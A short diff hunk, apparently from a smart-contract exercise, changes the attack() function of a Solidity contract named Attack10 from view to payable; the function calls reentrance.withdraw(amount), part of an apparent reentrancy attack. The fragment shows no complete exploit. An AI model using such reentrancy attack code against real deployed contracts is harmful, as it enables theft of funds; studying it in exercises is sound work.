@@ -15,7 +15,7 @@ contract Attack10 {
         amount = _amount;
     }
 
-    function attack() public view {
+    function attack() public payable {
         reentrance.withdraw(amount);
     }
 
